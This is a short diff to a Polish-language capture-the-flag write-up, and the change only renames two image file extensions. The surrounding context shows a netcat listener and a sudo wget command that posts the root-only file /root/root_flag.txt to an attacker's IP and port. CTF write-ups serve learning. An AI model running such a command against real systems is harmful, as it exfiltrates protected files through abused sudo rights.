@@ -95,10 +95,10 @@ nc -lvnp [PORT]
 sudo /usr/bin/wget --post-file=/root/root_flag.txt [IP]:[PORT]
 ```
 
-![Get](img/Get.JPG)
+![Get](img/Get.jpg)
 
 Odczytujemy drugą flagę:
 
-![Flag2](img/Flag2.JPG)
+![Flag2](img/Flag2.jpg)
 
 Do zobaczenia na kolejnych CTF-ach!
